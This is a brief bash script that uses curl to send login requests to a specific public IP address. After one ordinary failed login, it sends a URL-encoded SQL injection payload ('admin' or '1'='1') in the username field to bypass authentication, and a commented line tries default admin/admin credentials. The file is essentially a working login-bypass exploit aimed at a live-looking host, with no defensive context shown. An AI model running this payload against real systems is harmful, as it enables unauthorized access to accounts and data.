#!/bin/bash

dangerous_query="admin'%20or%20'1'%3D'1" #"'1 or '1'='1" -->>>>>>>>> will result in 'admin' or '1'='1' AND ....
curl --data "username=admin&password=invalid&submit-login=Login" http://46.101.91.7/login -v

echo "username="$dangerous_query"&password=hello&submit-login=Login"
curl --data "username="$dangerous_query"&password=invalid&submit-login=Login" http://46.101.91.7/login -v

#curl --data "username=admin&password=admin&submit-login=Login" http://46.101.91.7/login -v
